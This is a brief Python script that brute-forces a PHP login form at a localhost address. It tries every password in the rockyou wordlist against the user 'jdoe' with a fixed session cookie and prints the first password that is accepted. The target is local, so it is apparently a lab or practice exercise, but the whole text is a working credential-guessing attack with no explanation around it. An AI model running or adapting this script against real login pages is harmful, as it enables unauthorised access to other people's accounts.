
import requests

url = 'http://127.0.0.1:8083/login.php'
cookies = {'PHPSESSID': 'd623e9d2d4ef4e7d842fc01fb9008f2c'}

with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
    for password in f:
        password = password.strip()
        r = requests.post(url, data={'username':'jdoe','password':password}, cookies=cookies, allow_redirects=False)
        if 'Invalid' not in r.text:
            print(f'FOUND: {password}')
            break
